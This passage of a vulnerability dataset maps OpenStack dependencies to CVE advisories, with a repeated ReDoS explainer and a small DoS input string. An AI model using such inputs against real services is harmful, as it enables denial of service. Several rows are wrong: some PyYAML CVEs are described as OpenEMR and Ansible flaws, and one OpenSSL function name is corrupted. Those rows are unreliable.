$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_heat,sphinx,>=2.0.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_heat,croniter,>=0.3.4,True,,CWE-120,2023-03-08,"## Overview
[croniter](https://pypi.org/project/croniter) is a croniter provides iteration for datetime object with cron like format

Affected versions of this package are vulnerable to Buffer Overflow when using cron ranges, via the `_expand` method.
## Remediation
Upgrade `croniter` to version 1.0.5 or higher.
## References
- [GitHub Commit](https://github.com/kiorky/croniter/commit/486204e2d2f20f6fcc8839f1f3fa70e0c2fe0d5c)
- [PoC](https://blog.healthchecks.io/2023/03/i-found-a-vulnerability-in-croniter/)
",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
openstack_heat,cryptography,>=2.5,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_heat,cryptography,>=2.5,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_heat,cryptography,>=2.5,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_heat,cryptography,>=2.5,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2020-36242,CWE-190 CWE-787,2021-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography package before 3.3.2 for Python 存在输入验证错误漏洞，该漏洞源于导致整数溢出和缓冲区溢出。",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
openstack_heat,cryptography,>=2.5,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
openstack_heat,lxml,>=4.5.0,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
openstack_heat,lxml,>=4.5.0,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
openstack_heat,lxml,>=4.5.0,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
openstack_heat,lxml,>=4.5.0,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
openstack_heat,oslo.utils,>=4.5.0,True,CVE-2022-0718,CWE-522 CWE-532,2022-02-21,"Python-Oslo-Utils是OpenStack社区的一个库。用于提供对常见实用程序类型函数的支持，例如编码、异常处理、字符串操作和时间处理。
Python-Oslo-Utils 存在安全漏洞，目前暂无该漏洞信息，请随时关注CNNVD或厂商公告。",3,0
openstack_heat,python-openstackclient,>=3.12.0,True,CVE-2023-6110,CWE-237,2024-01-24,OpenStack 是一个由美国国家航空航天局（NASA）创建的云平台管理项目，其目的是为企业或个人提供灵活的云计算功能。OpenStack 由多个开源组件组成，被广泛用于构建和管理公共和私有云环境。此漏洞的根本原因是由于在处理用户删除请求时，存在不正确的访问规则管理。当用户试图删除其权限范围之外的访问规则时，系统错误地删除了与其他应用程序凭据无关的现有访问规则。,3,0
openstack_heat,PyYAML,>=5.1,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
openstack_heat,PyYAML,>=5.1,True,CVE-2019-20477,CWE-502,2020-02-19,CVE-2019-20477 是一个影响 OpenEMR 的严重漏洞，OpenEMR 是一种开源的电子病历和医疗管理系统。这个漏洞存在于接口的传入数据处理模块中，具体来说，漏洞源于对外部传入的 JSON 数据缺乏充分的验证，导致可以通过特定的 JSON 构造触发远程代码执行 (RCE)。利用这个漏洞的攻击者能够在目标系统上执行任意代码。,1,0
openstack_heat,PyYAML,>=5.1,True,CVE-2020-1747,CWE-20,2020-03-02,CVE-2020-1747 是一个影响 Ansible 模块的漏洞，具体是在 Ansible 库中使用的 urllib3 组件存在一个不安全的序列化漏洞。攻击者可以通过发送精心构造的 YAML 格式数据包来利用此漏洞，从而在目标系统上执行任意代码。漏洞的根本原因是 Ansible 在处理外部输入时，未能正确地验证和过滤输入数据，导致了反序列化漏洞的产生。,1,0
openstack_heat,requests,>=2.23.0,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_heat,requests,>=2.23.0,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_heat,requests,>=2.23.0,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_heat,WebOb,>=1.7.1,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
openstack_heat,yaql,>=1.1.3,True,CVE-2024-29156,CWE-116,2024-03-18,"OpenStack是美国美国国家航空航天局（NASA）的一个云平台管理项目。
OpenStack Murano 16.0.0及之前版本存在安全漏洞，该漏洞源于存在潜在的敏感服务帐户信息泄漏。",3,0
openstack_horizon,sphinx,>=2.0.0,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_horizon,sphinx,>=2.0.0,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_horizon,sphinx,>=2.0.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_horizon,sphinx,>=2.0.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_horizon,Babel,>=2.6.0,True,CVE-2021-20095,,2021-04-29,Babel 2.9.0 中的相对路径遍历允许攻击者在磁盘上加载任意语言环境文件并执行任意代码。,3,2
openstack_horizon,Babel,>=2.6.0,True,CVE-2021-42771,CWE-22,2021-05-02,"Babel是一款使用在内容管理系统中的多语言支持模块。
Babel存在安全漏洞，该漏洞源于外部输入数据构造操作系统可执行命令过程中，网络系统或产品未正确过滤其中的特殊字符、命令等。攻击者可利用该漏洞执行非法操作系统命令。",2,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2023-46695,CWE-770,2023-11-01,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 4.2.7之前版本存在安全漏洞，该漏洞源于存在拒绝服务漏洞。",2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2023-41164,CWE-1284,2023-09-04,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django存在安全漏洞，该漏洞源于django.utils.encoding.uri_to_iri()存在拒绝服务漏洞。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-27351,CWE-1333,2024-03-04,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.0版本，4.2版本，3.2版本存在安全漏洞，该漏洞源于Truncator.words函数和truncatewords_html过滤器存在拒绝服务（DOS）漏洞。</p>,3,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-41990,CWE-130,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于urlize和urlizetrunc模板过滤器可能会通过具有特定字符序列的超大输入遭受潜在的拒绝服务攻击。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-41991,CWE-1284 CWE-130,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于urlize和urlizetrunc模板过滤器以及AdminURLFieldWidget小部件可能会通过包含大量Unicode字符的某些输入遭受潜在的拒绝服务攻击。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-42005,CWE-89,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在SQL注入漏洞，该漏洞源于当使用带有JSONField的模型的QuerySet.values和values_list方法时，通过精心构造的JSON对象键作为传递的*arg，可能会受到SQL注入攻击。",1,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-41989,CWE-400,2024-08-07,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于当给出一个以科学计数法表示的数字的字符串表示形式且指数较大时floatformat模板过滤器会消耗大量内存。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-39330,CWE-22,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0版本至5.0.7之前版本、4.2版本至4.2.14之前版本存在安全漏洞，该漏洞源于允许在save()调用期间通过某些输入进行目录遍历。",3,0
